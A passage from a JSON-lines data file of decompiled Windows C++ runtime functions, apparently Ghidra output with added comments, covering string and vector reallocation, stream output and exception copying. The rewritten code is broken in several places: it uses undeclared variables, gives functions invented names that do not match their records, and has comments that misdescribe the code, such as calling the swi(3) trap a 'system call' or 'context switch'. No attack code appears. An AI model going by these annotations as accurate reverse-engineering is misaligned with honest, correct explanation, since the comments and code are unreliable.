Null-terminate the copied data\n    } else {\n        undefined8 *existing_data_pointer = (undefined8 *)*memory_structure; // Pointer to existing data\n        FUN_14000c330(new_memory_pointer, existing_data_pointer, current_allocated_size); // Copy data for large allocations\n        FUN_14000c330(allocated_memory_pointer, source_data, data_size); // Copy data from param_4\n        *(undefined1 *)((longlong)allocated_memory_pointer + data_size) = 0; // Null-terminate the copied data\n        // Check if the previous allocation is too large for the new size\n        if ((0xfff < max_allocated_size + 1) && (0x1f < (ulonglong)((longlong)existing_data_pointer + (-8 - existing_data_pointer[-1])))) {\n            goto FUN_140008847; // Go to error handling if condition met\n        }\n        thunk_FUN_14000b460(); // Call additional cleanup function\n    }\n    \n    *memory_structure = (longlong)new_memory_pointer; // Update the pointer in the parameter structure\n    return memory_structure; // Return the updated parameter structure\n}\n"}
{"Function Name": "FUN_1400086fe", "Address": "1400086fe", "Source Code": "\nvoid FUN_1400086fe(longlong param_1,longlong param_2)\n{\n    undefined8 *pointerToUndefined8_1; // Pointer to an undefined8 type\n    ulonglong ulongValue1; // Variable to hold a ulonglong value\n    undefined8 *pointerToUndefined8_2; // Pointer to an undefined8 type\n    code *functionPointer; // Pointer to a function code\n    void *memoryPointer; // Pointer for memory allocation\n    ulonglong ulongValue2; // Variable to hold a ulonglong value\n    ulonglong ulongValue3; // Variable to hold a ulonglong value\n    undefined8 *pointerToUndefined8_3; // Pointer to an undefined8 type\n    undefined8 *pointerToArray; // Pointer to an undefined8 type (uninitialized)\n    ulonglong ulongValue4; // Variable to hold a ulonglong value (uninitialized)\n    ulonglong ulongValue5; // Variable to hold a ulonglong value (uninitialized)\n    ulonglong stackVariable; // Variable to hold a ulonglong value (stack variable)\n\n    ulongValue1 = *(ulonglong *)(param_1 + 0x18); // Retrieve value from memory at param_1 + 0x18\n    ulongValue2 = param_2 + ulongValue5 | 0xf; // Calculate uVar6 based on param_2 and unaff_R14\n\n    // Check conditions for adjusting unaff_RDI\n    if (((ulongValue2 <= ulongValue4) && (ulongValue1 <= ulongValue4 - (ulongValue1 >> 1))) &&\n        (ulongValue3 = (ulongValue1 >> 1) + ulongValue1, ulongValue4 = ulongValue2, ulongValue2 < ulongValue3)) {\n        ulongValue4 = ulongValue3; // Update unaff_RDI if conditions are met\n    }\n\n    ulongValue2 = ulongValue4 + 1; // Increment uVar6\n    if (ulongValue4 == 0xffffffffffffffff) {\n        ulongValue2 = 0xffffffffffffffff; // Handle overflow case\n    }\n\n    // Allocate memory based on the value of uVar6\n    if (ulongValue2 < 0x1000) {\n        pointerToUndefined8_3 = (ulongValue2 == 0) ? (undefined8 *)0x0 : (undefined8 *)operator_new(ulongValue2); // Allocate small memory\n    } else {\n        ulongValue3 = ulongValue2 + 0x27; // Adjust uVar7 for larger allocation\n        if (ulongValue3 <= ulongValue2) {\n            ulongValue3 = 0xffffffffffffffff; // Handle overflow case\n        }\n        memoryPointer = operator_new(ulongValue3); // Allocate larger memory\n        if (memoryPointer == (void *)0x0) goto FUN_140008847; // Check for allocation failure\n        pointerToUndefined8_3 = (undefined8 *)((longlong)memoryPointer + 0x27U & 0xffffffffffffffe0); // Align pointer\n        pointerToUndefined8_3[-1] = memoryPointer; // Store original pointer for later use\n    }\n\n    // Set values in the unaff_RSI array\n    pointerToArray[2] = param_2 + ulongValue5; // Set third element\n    pointerToUndefined8_1 = (undefined8 *)((longlong)pointerToUndefined8_3 + ulongValue5); // Adjust pointer with unaff_R14\n    pointerToArray[3] = ulongValue4; // Set fourth element\n\n    // Conditional processing based on uVar2\n    if (ulongValue1 < 0x10) {\n        FUN_14000c330(pointerToUndefined8_3, pointerToArray, ulongValue5); // Call function for small uVar2\n        FUN_14000c330(pointerToUndefined8_1, unaff_R13, stackVariable); // Call function with adjusted pointer\n        *(undefined1 *)((longlong)pointerToUndefined8_1 + stackVariable) = 0; // Null-terminate\n    } else {\n        pointerToUndefined8_2 = (undefined8 *)*pointerToArray; // Get pointer from unaff_RSI\n        FUN_14000c330(pointerToUndefined8_3, pointerToUndefined8_2, ulongValue5); // Call function with puVar3\n        FUN_14000c330(pointerToUndefined8_1, unaff_R13, stackVariable); // Call function with adjusted pointer\n        *(undefined1 *)((longlong)pointerToUndefined8_1 + stackVariable) = 0; // Null-terminate\n\n        // Check for conditions to call error handling\n        if ((0xfff < ulongValue1 + 1) && (0x1f < (ulonglong)((longlong)pointerToUndefined8_2 + (-8 - pointerToUndefined8_2[-1])))) {\n            FUN_140008847: // Label for error handling\n            FUN_14000ed18(); // Call error handling function\n            functionPointer = (code *)swi(3); // Switch to system call\n            (*functionPointer)(); // Execute the system call\n            return; // Exit function\n        }\n        thunk_FUN_14000b460(); // Call thunk function\n    }\n    *pointerToArray = pointerToUndefined8_3; // Store allocated pointer in unaff_RSI\n    return; // Exit function\n}\n"}
{"Function Name": "FUN_140008847", "Address": "140008847", "Source Code": "\nvoid executeFunction(void) // Function definition for FUN_140008847\n{\n    callAnotherFunction(); // Call the function FUN_14000ed18\n    ((code *)switchFunction(3))(); // Call the function pointed to by swi(3)\n}\n"}
{"Function Name": "FUN_14000884d", "Address": "14000884d", "Source Code": "\nvoid FUN_14000884d(void) // Function definition for FUN_14000884d\n{\n    (*((code *)switch_function(3)))(); // Call the function pointed to by the result of swi(3)\n}\n"}
{"Function Name": "FUN_140008860", "Address": "140008860", "Source Code": "\nundefined8 * FUN_140008860(undefined8 *exception_data,longlong memory_location)\n{\n    // Set the first element of param_1 to the vftable of std::bad_cast\n    *exception_data = std::bad_cast::vftable;\n\n    // Initialize the second element of param_1 to 0\n    exception_data[1] = 0;\n\n    // Copy exception data from the memory location (param_2 + 8) to param_1 + 1\n    __std_exception_copy((longlong *)(memory_location + 8), exception_data + 1);\n\n    // Return the modified param_1\n    return exception_data;\n}\n"}
{"Function Name": "FUN_1400088a0", "Address": "1400088a0", "Source Code": "\nvoid FUN_1400088a0(longlong *inputPointer)\n{\n    // Check if there are no uncaught exceptions\n    if (!hasUncaughtExceptions()) {\n        // Call FUN_140008a80 with the dereferenced value of param_1\n        processValue((longlong *)*inputPointer);\n    }\n    \n    // Retrieve a pointer from a specific memory location based on param_1\n    longlong *retrievedPointer = *(longlong **)((longlong)*(int *)(*(longlong *)*inputPointer + 4) + 0x48 + *inputPointer);\n    \n    // Check if plVar1 is not null\n    if (retrievedPointer != (longlong *)0x0) {\n        // Call the function pointed to by the address stored in plVar1 + 0x10\n        (**(code **)(*retrievedPointer + 0x10))();\n    }\n}\n"}
{"Function Name": "FUN_1400088f0", "Address": "1400088f0", "Source Code": "\nundefined8 * FUN_1400088f0(undefined8 *output_pointer,longlong *input_pointer)\n{\n    longlong *pointer_var; // Pointer to a longlong variable\n    int int_value; // Variable to hold an integer value\n    longlong long_value; // Variable to hold a longlong value\n\n    *output_pointer = input_pointer; // Assign param_2 to the first element of param_1\n    long_value = *input_pointer; // Dereference param_2 to get its value\n\n    // Retrieve a pointer from a specific offset based on the value of lVar4 and param_2\n    pointer_var = *(longlong **)((longlong)*(int *)(long_value + 4) + 0x48 + (longlong)input_pointer);\n    \n    // Check if plVar1 is not null\n    if (pointer_var != (longlong *)0x0) {\n        // Call a function pointed to by plVar1 with an offset of 8\n        (**(code **)(*pointer_var + 8))();\n    }\n\n    // Check if a specific condition is met\n    if ((*(int *)((longlong)*(int *)(long_value + 4) + 0x10 + (longlong)input_pointer) == 0) &&\n        (pointer_var = *(longlong **)((longlong)*(int *)(long_value + 4) + 0x50 + (longlong)input_pointer),\n        pointer_var != (longlong *)0x0 && pointer_var != input_pointer &&\n        (*(longlong *)((longlong)*(int *)(*pointer_var + 4) + 0x48 + (longlong)pointer_var) != 0))) {\n        \n        longlong local_long_value; // Local variable to hold a longlong value\n        char local_char_value; // Local variable to hold a char value\n\n        // Recursive call to FUN_1400088f0 with local_20 and plVar1\n        FUN_1400088f0(&local_long_value, pointer_var);\n\n        // Check if local_18 is not equal to '\\0'\n        if (local_char_value != '\\0') {\n            // Call a function pointed to by a specific offset of plVar1\n            int_value = (**(code **)(**(longlong **)((longlong)*(int *)(*pointer_var + 4) + 0x48 + (longlong)pointer_var) + 0x68))();\n            \n            // If the function returns -1, perform another operation\n            if (int_value == -1) {\n                long_value = (longlong)*(int *)(*pointer_var + 4) + (longlong)pointer_var;\n                FUN_1400024f0(long_value, *(uint *)(long_value + 0x10) | 4, '\\0');\n            }\n        }\n\n        // Check if there are no uncaught exceptions\n        if (!__uncaught_exception()) {\n            // Call FUN_140008a80 with local_20\n            FUN_140008a80(local_long_value);\n        }\n\n        // Retrieve a pointer from a specific offset based on local_20\n        pointer_var = *(longlong **)((longlong)*(int *)(*local_long_value + 4) + 0x48 + (longlong)local_long_value);\n        \n        // Check if plVar1 is not null\n        if (pointer_var != (longlong *)0x0) {\n            // Call a function pointed to by plVar1 with an offset of 0x10\n            (**(code **)(*pointer_var + 0x10))();\n        }\n    }\n\n    // Set the second element of param_1 to a boolean value based on a condition\n    *(bool *)(output_pointer + 1) = *(int *)((longlong)*(int *)(long_value + 4) + 0x10 + (longlong)input_pointer) == 0;\n    \n    return output_pointer; // Return the modified param_1\n}\n"}
{"Function Name": "FUN_140008a10", "Address": "140008a10", "Source Code": "\nvoid FUN_140008a10(longlong *inputPointer)\n{\n    // Declare a pointer to an undefined8 type and initialize it with the value pointed to by param_1\n    undefined8 *functionPointer = (undefined8 *)*inputPointer;\n\n    // Check if puVar1 is not a null pointer\n    if (functionPointer != (undefined8 *)0x0) {\n        // Call the function pointed to by puVar1, passing puVar1 and the integer 1 as arguments\n        (**(code **)*functionPointer)(functionPointer, 1);\n    }\n}\n"}
{"Function Name": "FUN_140008a30", "Address": "140008a30", "Source Code": "\nvoid executeFunction(void) // Function definition for FUN_140008a30\n{\n    ((code *)switchInstruction(3))(); // Call the function obtained from swi(3)\n    return; // Exit the function\n}\n"}
{"Function Name": "FUN_140008a50", "Address": "140008a50", "Source Code": "\nvoid FUN_140008a50(longlong *inputPointer)\n{\n    longlong *retrievedPointer; // Declare a pointer to longlong\n\n    // Retrieve a pointer from a specific memory location based on param_1\n    retrievedPointer = *(longlong **)((longlong)*(int *)(*(longlong *)*inputPointer + 4) + 0x48 + *inputPointer);\n\n    // Check if the retrieved pointer is not null\n    if (retrievedPointer != (longlong *)0x0) {\n        // Call a function pointed to by the address stored at plVar1 + 0x10\n        (**(code **)(*retrievedPointer + 0x10))();\n    }\n}\n"}
{"Function Name": "FUN_140008a80", "Address": "140008a80", "Source Code": "\nvoid FUN_140008a80(longlong *input_pointer)\n{\n    // Retrieve an integer value from the memory location pointed to by param_1 and cast it to longlong\n    longlong retrieved_value = (longlong)*(int *)(*input_pointer + 4);\n    \n    // Check if the value at offset 0x10 from lVar2 + param_1 is zero\n    // and if the second bit of the byte at offset 0x18 from lVar2 + param_1 is set\n    if ((*(int *)(retrieved_value + 0x10 + (longlong)input_pointer) == 0) &&\n        ((*(byte *)(retrieved_value + 0x18 + (longlong)input_pointer) & 2) != 0)) {\n        \n        // Call the function pointed to by the pointer at offset 0x68 from the structure at lVar2 + param_1\n        // If the return value is -1, execute the following function\n        if ((**(code **)(**(longlong **)(retrieved_value + 0x48 + (longlong)input_pointer) + 0x68))() == -1) {\n            // Call FUN_1400024f0 with the calculated parameters\n            FUN_1400024f0(retrieved_value + (longlong)input_pointer, *(uint *)(retrieved_value + 0x10 + (longlong)input_pointer) | 4, '\\0');\n        }\n    }\n}\n"}
{"Function Name": "FUN_140008ae0", "Address": "140008ae0", "Source Code": "\nlonglong * FUN_140008ae0(longlong *data_array, undefined8 *input_values, ulonglong size_to_add)\n{\n    longlong current_size = data_array[2]; // Retrieve the current value from the third element of param_1\n    if (size_to_add <= (ulonglong)(data_array[3] - current_size)) { // Check if param_3 fits within the available space\n        data_array[2] = current_size + size_to_add; // Update the third element of param_1 with the new size\n        longlong *adjusted_pointer = (7 < (ulonglong)data_array[3]) ? (longlong *)*data_array : data_array; // Determine the appropriate pointer based on the size\n        FUN_14000c330((undefined8 *)((longlong)adjusted_pointer + current_size * 2), input_values, size_to_add * 2); // Call another function with the calculated address and parameters\n        *(undefined2 *)((longlong)adjusted_pointer + (current_size + size_to_add) * 2) = 0; // Null-terminate the data at the new end position\n        return data_array; // Return the updated param_1\n    }\n    return FUN_1400091b0(data_array, size_to_add, 0, input_values, size_to_add); // If not enough space, call a different function to handle the situation\n}\n"}
{"Function Name": "FUN_140008aff", "Address": "140008aff", "Source Code": "\nvoid FUN_140008aff(longlong offset, undefined8 *data_pointer, ulonglong threshold)\n{\n    // Initialize unaff_RBX to point to the value at the address stored in unaff_RBX\n    undefined8 *reference = (undefined8 *)*reference;\n\n    // Check if param_3 is greater than 7\n    if (7 < threshold) {\n        // If true, update unaff_RBX to point to the value at the address stored in unaff_RBX again\n        reference = (undefined8 *)*reference;\n    }\n\n    // Call FUN_14000c330 with a calculated address, param_2, and double the value of in_R10\n    FUN_14000c330((undefined8 *)((longlong)reference + offset * 2), data_pointer, multiplier * 2);\n\n    // Set the value at the calculated address to 0\n    *(undefined2 *)((longlong)reference + (offset + multiplier) * 2) = 0;\n\n    // Return from the function\n    return;\n}\n"}
{"Function Name": "FUN_140008b43", "Address": "140008b43", "Source Code": "\nvoid FUN_140008b43(undefined8 input1, undefined8 input2)\n{\n    ulonglong registerValue; // Declare a variable to hold a 64-bit unsigned integer from the R10 register\n    FUN_1400091b0(NULL, registerValue, 0, input2, registerValue); // Call the function FUN_1400091b0 with NULL, in_R10, 0, param_2, and in_R10 as arguments\n    return; // Exit the function\n}\n"}
{"Function Name": "FUN_140008b60", "Address": "140008b60", "Source Code": "\nlonglong * FUN_140008b60(longlong *input_pointer, byte input_byte)\n{\n    longlong *longlong_pointer; // Pointer to a longlong\n    uint uint_value_4; // Variable to hold a uint value\n    uint uint_value_6; // Variable to hold a uint value\n    longlong longlong_value_8 = 0; // Initialize lVar8 to 0\n    longlong longlong_value_11; // Variable to hold a longlong value\n    longlong *local_pointer; // Local pointer to hold a longlong\n\n    FUN_1400088f0(&local_pointer, input_pointer); // Call function to initialize local_48\n    if (local_pointer[0] == 0) goto LAB_140008d13; // Check if the first element of local_48 is 0\n\n    longlong_value_11 = *(longlong *)((longlong)*(int *)(*input_pointer + 4) + 0x28 + (longlong)input_pointer); // Get a value from param_1\n    if (1 < longlong_value_11) { // Check if lVar11 is greater than 1\n        longlong_value_11--; // Decrement lVar11\n    }\n\n    if ((*(uint *)((longlong)*(int *)(*input_pointer + 4) + 0x18 + (longlong)input_pointer) & 0x1c0) != 0x40) { // Check a condition on param_1\n        while (uint_value_6 = (uint)longlong_value_8, uint_value_6 == 0) { // Loop while lVar8 is 0\n            if (longlong_value_11 < 1) goto LAB_140008c49; // Check if lVar11 is less than 1\n            longlong_pointer = *(longlong **)((longlong)*(int *)(*input_pointer + 4) + 0x48 + (longlong)input_pointer); // Get a pointer from param_1\n            byte byte_value_1 = *(byte *)((longlong)*(int *)(*input_pointer + 4) + 0x58 + (longlong)input_pointer); // Get a byte value from param_1\n            if (*(longlong *)longlong_pointer[8] == 0) { // Check if the value at plVar2[8] is 0\n                uint_value_6 = (**(code **)(*longlong_pointer + 0x18))(longlong_pointer, byte_value_1); // Call a function using a pointer\n            } else {\n                int int_value_7 = *(int *)longlong_pointer[0xb]; // Get an integer value from plVar2[0xb]\n                if (int_value_7 < 1) goto LAB_140008c2d; // Check if iVar7 is less than 1\n                *(int *)longlong_pointer[0xb] = int_value_7 - 1; // Decrement iVar7\n                byte *byte_pointer_3 = *(byte **)longlong_pointer[8]; // Get a byte pointer from plVar2[8]\n                *(byte **)longlong_pointer[8] = byte_pointer_3 + 1; // Increment the byte pointer\n                *byte_pointer_3 = byte_value_1; // Assign bVar1 to the byte pointer\n                uint_value_6 = (uint)byte_value_1; // Set uVar6 to the value of bVar1\n            }\n            longlong_value_11--; // Decrement lVar11\n            longlong_value_8 = (uint_value_6 != 0xffffffff) ? longlong_value_8 : 4; // Update lVar8 based on uVar6\n        }\n        goto LAB_140008d13; // Jump to the end label\n    }\nLAB_140008c49:\n    longlong_pointer = *(longlong **)((longlong)*(int *)(*input_pointer + 4) + 0x48 + (longlong)input_pointer); // Get a pointer from param_1\n    if (*(longlong *)longlong_pointer[8] == 0) { // Check if the value at plVar2[8] is 0\n        uint_value_6 = (**(code **)(*longlong_pointer + 0x18))(longlong_pointer, input_byte); // Call a function using a pointer\n    } else {\n        int int_value_7 = *(int *)longlong_pointer[0xb]; // Get an integer value from plVar2[0xb]\n        if (int_value_7 < 1) goto LAB_140008c80; // Check if iVar7 is less than 1\n        *(int *)longlong_pointer[0xb] = int_value_7 - 1; // Decrement iVar7\n        byte *byte_pointer_3 = *(byte **)longlong_pointer[8]; // Get a byte pointer from plVar2[8]\n        *(byte **)longlong_pointer[8] = byte_pointer_3 + 1; // Increment the byte pointer\n        *byte_pointer_3 = input_byte; // Assign param_2 to the byte pointer\n        uint_value_6 = (uint)input_byte; // Set uVar6 to the value of param_2\n    }\n    longlong_value_8 = (uint_value_6 == 0xffffffff) ? 4 : longlong_value_8; // Update lVar8 based on uVar6\n\n    while ((uint_value_6 = (uint)longlong_value_8, uint_value_6 == 0 && (0 < longlong_value_11))) { // Loop while lVar8 is 0 and lVar11 is greater than 0\n        longlong_pointer = *(longlong **)((longlong)*(int *)(*input_pointer + 4) + 0x48 + (longlong)input_pointer); // Get a pointer from param_1\n        byte byte_value_1 = *(byte *)((longlong)*(int *)(*input_pointer + 4) + 0x58 + (longlong)input_pointer); // Get a byte value from param_1\n        if (*(longlong *)longlong_pointer[8] == 0) { // Check if the value at plVar2[8] is 0\n            int int_value_7 = (**(code **)(*longlong_pointer + 0x18))(longlong_pointer, byte_value_1, longlong_pointer, byte_value_1, 0, input_pointer); // Call a function using a pointer\n            longlong_value_11--; // Decrement lVar11\n            longlong_value_8 = (int_value_7 != -1) ? longlong_value_8 : 4; // Update lVar8 based on iVar7\n        } else {\n            int int_value_7 = *(int *)longlong_pointer[0xb]; // Get an integer value from plVar2[0xb]\n            if (int_value_7 < 1) goto LAB_140008cea; // Check if iVar7 is less than 1\n            *(int *)longlong_pointer[0xb] = int_value_7 - 1; // Decrement iVar7\n            byte *byte_pointer_3 = *(byte **)longlong_pointer[8]; // Get a byte pointer from plVar2[8]\n            *(byte **)longlong_pointer[8] = byte_pointer_3 + 1; // Increment the byte pointer\n            *byte_pointer_3 = byte_value_1; // Assign bVar1 to the byte pointer\n            longlong_value_11--; // Decrement lVar11\n            longlong_value_8 = (byte_value_1 != 0xffffffff) ? longlong_value_8 : 4; // Update lVar8 based on bVar1\n        }\n    }\nLAB_140008d13:\n    *(undefined8 *)((longlong)*(int *)(*input_pointer + 4) + 0x28 + (longlong)input_pointer) = 0; // Set a value in param_1 to 0\n    longlong longlong_value_8 = (longlong)*(int *)(*input_pointer + 4) + (longlong)input_pointer; // Calculate a new lVar8\n    uint_value_6 = *(uint *)(longlong_value_8 + 0x10) | uint_value_6; // Update uVar6 with a value from param_1\n    uint_value_4 = uint_value_6 | 4; // Set uVar4 based on uVar6\n    if (*(longlong *)(longlong_value_8 + 0x48) != 0) { // Check if a value at lVar8 + 0x48 is not 0\n        uint_value_4 = uint_value_6; // Update uVar4 based on uVar6\n    }\n    FUN_1400024f0(longlong_value_8, uint_value_4, '\\0'); // Call a function with lVar8 and uVar4\n    if (!__uncaught_exception()) { // Check for uncaught exceptions\n        FUN_140008a80(local_pointer); // Call a function with local_48\n    }\n    longlong_pointer = *(longlong **)((longlong)*(int *)(*local_pointer + 4) + 0x48 + (longlong)local_pointer); // Get a pointer from local_48\n    if (longlong_pointer != (longlong *)0x0) { // Check if plVar2 is not null\n        (**(code **)(*longlong_pointer + 0x10))(); // Call a function using a pointer\n    }\n    return input_pointer; // Return param_1\n}\n"}
{"Function Name": "FUN_140008db0", "Address": "140008db0", "Source Code": "\nvoid FUN_140008db0(longlong *memoryBlock, ulonglong inputSize)\n{\n    longlong secondElement = memoryBlock[1]; // Store the second element of param_1\n    longlong firstElement = *memoryBlock;    // Store the first element of param_1\n    ulonglong memorySize = memoryBlock[2] - *memoryBlock; // Calculate the size of the memory block\n    ulonglong allocatedSize = inputSize;   // Copy the input parameter param_2\n\n    // Check if param_2 exceeds the maximum value for a signed long long\n    if (0x7fffffffffffffff < inputSize) {\n        FUN_140009370(); // Call a function if param_2 is too large\n        code *systemCallPointer = (code *)swi(3); // Get a pointer to a system call\n        (*systemCallPointer)(); // Execute the system call\n        return; // Exit the function\n    }\n\n    // Check if uVar5 is within a safe range and adjust uVar6 if necessary\n    if ((memorySize <= 0x7fffffffffffffff - (memorySize >> 1)) &&\n        (allocatedSize = (memorySize >> 1) + memorySize, allocatedSize < inputSize)) {\n        allocatedSize = inputSize; // Set uVar6 to param_2 if conditions are met\n    }\n\n    undefined8 *allocatedMemory; // Pointer for allocated memory\n    // Allocate memory based on the size of uVar6\n    if (allocatedSize < 0x1000) {\n        allocatedMemory = (allocatedSize == 0) ? (undefined8 *)0x0 : (undefined8 *)operator_new(allocatedSize); // Allocate small block\n    } else {\n        memorySize = allocatedSize + 0x27; // Adjust size for alignment\n        if (memorySize <= allocatedSize) {\n            memorySize = 0xffffffffffffffff; // Prevent overflow\n        }\n        void *rawMemory = operator_new(memorySize); // Allocate larger block\n        if (rawMemory == (void *)0x0) goto FUN_140008edf; // Check for allocation failure\n        allocatedMemory = (undefined8 *)((longlong)rawMemory + 0x27U & 0xffffffffffffffe0); // Align pointer\n        allocatedMemory[-1] = rawMemory; // Store original pointer for later deallocation\n    }\n\n    // Call a function to initialize the allocated memory\n    FUN_14000c740((undefined1 (*) [16])((longlong)allocatedMemory + (secondElement - firstElement)), 0,\n                  inputSize - (secondElement - firstElement)); // Initialize memory with specific parameters\n    FUN_14000c330(allocatedMemory, (undefined8 *)*memoryBlock, memoryBlock[1] - *memoryBlock); // Copy data to new memory\n\n    // Check if the first element of param_1 is not null\n    if (*memoryBlock != 0) {\n        // Check conditions for potential memory corruption\n        if ((0xfff < (ulonglong)(memoryBlock[2] - *memoryBlock)) &&\n            (0x1f < (*memoryBlock - *(longlong *)(*memoryBlock + -8)) - 8U)) {\n            FUN_140008edf: // Label for error handling\n            FUN_14000ed18(); // Call error handling function\n            code *systemCallPointer = (code *)swi(3); // Get a pointer to a system call\n            (*systemCallPointer)(); // Execute the system call\n            return; // Exit the function\n        }\n        thunk_FUN_14000b460(); // Call another function for further processing\n    }\n\n    // Update the elements of param_1 with the new memory information\n    memoryBlock[1] = inputSize + (longlong)allocatedMemory; // Set the second element to the new size\n    *memoryBlock = (longlong)allocatedMemory; // Set the first element to the new pointer\n    memoryBlock[2] = (longlong)allocatedMemory + allocatedSize; // Set the third element to the end of the new memory block\n}\n"}
{"Function Name": "FUN_140008dd1", "Address": "140008dd1", "Source Code": "\nvoid FUN_140008dd1(longlong *inputArray, longlong size)\n{\n    longlong secondElement = inputArray[1]; // Store the second element of param_1 in lVar1\n    longlong firstElement = *inputArray;    // Store the first element of param_1 in lVar2\n    ulonglong sizeDifference = inputArray[2] - *unaffRSIPointer; // Calculate uVar5 as the difference between the third element of param_1 and the value pointed by unaff_RSI\n    ulonglong allocatedSize = unaffR14Value; // Initialize uVar6 with the value of unaff_R14\n\n    // Check if uVar5 is less than or equal to half of param_2 and adjust uVar6 accordingly\n    if ((sizeDifference <= size - (sizeDifference >> 1)) && (allocatedSize = (sizeDifference >> 1) + sizeDifference, allocatedSize < unaffR14Value)) {\n        allocatedSize = unaffR14Value; // Set uVar6 to unaff_R14 if the condition is met\n    }\n\n    undefined8 *memoryPointer; // Declare a pointer for undefined8 type\n    // Allocate memory based on the value of uVar6\n    if (allocatedSize < 0x1000) {\n        memoryPointer = (allocatedSize == 0) ? (undefined8 *)0x0 : (undefined8 *)operator_new(allocatedSize); // Allocate memory if uVar6 is not zero\n    } else {\n        sizeDifference = allocatedSize + 0x27; // Adjust uVar5 for alignment\n        if (sizeDifference <= allocatedSize) {\n            sizeDifference = 0xffffffffffffffff; // Prevent overflow\n        }\n        void *rawMemory = operator_new(sizeDifference); // Allocate memory with adjusted size\n        if (rawMemory == (void *)0x0) goto FUN_140008edf; // Check for allocation failure\n        memoryPointer = (undefined8 *)((longlong)rawMemory + 0x27U & 0xffffffffffffffe0); // Align the pointer\n        memoryPointer[-1] = rawMemory; // Store the original pointer before the aligned pointer\n    }\n\n    // Call a function to initialize the allocated memory\n    FUN_14000c740((undefined1 (*) [16])((longlong)memoryPointer + (secondElement - firstElement)), 0, unaffR14Value - (secondElement - firstElement));\n    // Call another function to perform additional operations on the allocated memory\n    FUN_14000c330(memoryPointer, (undefined8 *)*unaffRSIPointer, unaffRSIPointer[1] - *unaffRSIPointer);\n\n    longlong unaffRSIValue = *unaffRSIPointer; // Store the value pointed by unaff_RSI in lVar1_check\n    if (unaffRSIValue != 0) { // Check if lVar1_check is not zero\n        // Validate the memory range and perform error handling if conditions are met\n        if ((0xfff < (ulonglong)(unaffRSIPointer[2] - unaffRSIValue)) &&\n            (0x1f < (unaffRSIValue - *(longlong *)(unaffRSIValue + -8)) - 8U)) {\n            FUN_140008edf: // Label for error handling\n            FUN_14000ed18(); // Call error handling function\n            code *systemCallFunction = (code *)swi(3); // Get a pointer to a system call\n            (*systemCallFunction)(); // Execute the system call\n            return; // Exit the function\n        }\n        thunk_FUN_14000b460(); // Call another function for additional processing\n    }\n\n    // Update the values in unaff_RSI with the new pointer and size information\n    unaffRSIPointer[1] = unaffR14Value + (longlong)memoryPointer; // Update the second element of unaff_RSI\n    *unaffRSIPointer = (longlong)memoryPointer; // Set the first element of unaff_RSI to the new pointer\n    unaffRSIPointer[2] = (longlong)memoryPointer + allocatedSize; // Update the third element of unaff_RSI with the new size\n    return; // Exit the function\n}\n"}
{"Function Name": "FUN_140008ed9", "Address": "140008ed9", "Source Code": "\nvoid executeFunction(void) // Function definition for FUN_140008ed9\n{\n    (*((code *)switchFunction(3)))(); // Call the function pointed to by the result of swi(3)\n}\n"}
{"Function Name": "FUN_140008edf", "Address": "140008edf", "Source Code": "\nvoid executeFunction(void) // Function definition for FUN_140008edf\n{\n    (*((code *)switchInterface(3)))(); // Call the function pointed to by the result of swi(3)\n}\n"}
{"Function Name": "FUN_140008ef0", "Address": "140008ef0", "Source Code": "\nlonglong * FUN_140008ef0(longlong *array, ulonglong requested_size)\n{\n    longlong current_size = array[2]; // Retrieve the current size from the parameter array\n    ulonglong current_allocation_size = array[3]; // Retrieve the current allocation size from the parameter array\n    ulonglong new_size, max_allocation_size, adjusted_size = 0x7ffffffffffffffe; // Initialize variables for size calculations\n\n    // Check if the requested size exceeds the maximum allowable size\n    if (0x7ffffffffffffffeU - current_size < requested_size) {\n        FUN_140008a30(); // Call a function to handle the size overflow\n        code *context_switch_function = (code *)swi(3); // Switch to a different context or function\n        return (longlong *)(*context_switch_function)(); // Return the result of the function call\n    }\n\n    // Calculate the new size and align it to the nearest multiple of 8\n    new_size = requested_size + current_size | 7;\n    // Check if the new size is within limits and if the current allocation can accommodate it\n    if (((new_size < 0x7fffffffffffffff) && (current_allocation_size <= 0x7ffffffffffffffe - (current_allocation_size >> 1))) &&\n        (max_allocation_size = (current_allocation_size >> 1) + current_allocation_size, adjusted_size = new_size, new_size < max_allocation_size)) {\n        adjusted_size = max_allocation_size; // Adjust uVar9 if the new size is less than the current allocation\n    }\n    new_size = adjusted_size + 1; // Increment the size for allocation\n    if (adjusted_size == 0xffffffffffffffff) {\n        new_size = 0xffffffffffffffff; // Handle overflow case\n    }\n    max_allocation_size = new_size * 2; // Double the size for allocation\n\n    undefined8 *allocated_memory_pointer; // Pointer for the allocated memory\n    // Check if the size is within a manageable range for allocation\n    if (new_size < 0x8000000000000000) {\n        if (0xfff < max_allocation_size) goto LAB_140008f8e; // If size exceeds a threshold, go to the large allocation section\n        allocated_memory_pointer = (max_allocation_size == 0) ? (undefined8 *)0x0 : (undefined8 *)operator_new(max_allocation_size); // Allocate memory\n    } else {\n        max_allocation_size = 0xffffffffffffffff; // Set to maximum size for large allocations\nLAB_140008f8e:\n        new_size = max_allocation_size + 0x27; // Adjust size for alignment\n        if (new_size <= max_allocation_size) {\n            new_size = 0xffffffffffffffff; // Handle overflow case\n        }\n        void *aligned_memory_pointer = operator_new(new_size); // Allocate memory\n        if (aligned_memory_pointer == (void *)0x0) goto FUN_140009046; // Check for allocation failure\n        allocated_memory_pointer = (undefined8 *)((longlong)aligned_memory_pointer + 0x27U & 0xffffffffffffffe0); // Align the pointer\n        allocated_memory_pointer[-1] = aligned_memory_pointer; // Store the original pointer for deallocation\n    }\n\n    array[2] = requested_size + current_size; // Update the size in the parameter array\n    array[3] = adjusted_size; // Update the allocation size in the parameter array\n\n    // If the current allocation size is less than 8, use a specific function for small allocations\n    if (current_allocation_size < 8) {\n        FUN_14000c330(allocated_memory_pointer, array, current_size * 2 + 2); // Call a function to handle the allocation\n    } else {\n        undefined8 *original_pointer = (undefined8 *)*array; // Retrieve the original pointer\n        FUN_14000c330(allocated_memory_pointer, original_pointer, current_size * 2 + 2); // Call a function to handle the allocation with the original pointer\n        // Check if the new allocation size exceeds a threshold and if the original pointer is valid\n        if ((0xfff < current_allocation_size * 2 + 2) && (0x1f < (ulonglong)((longlong)original_pointer + (-8 - original_pointer[-1])))) {\nFUN_140009046:\n            FUN_14000ed18(); // Handle deallocation or cleanup\n            code *context_switch_function = (code *)swi(3); // Switch to a different context or function\n            return (longlong *)(*context_switch_function)(); // Return the result of the function call\n        }\n        thunk_FUN_14000b460(); // Call a function for additional processing\n    }\n    *array = (longlong)allocated_memory_pointer; // Store the new pointer in the parameter array\n    return array; // Return the updated parameter array\n}\n"}
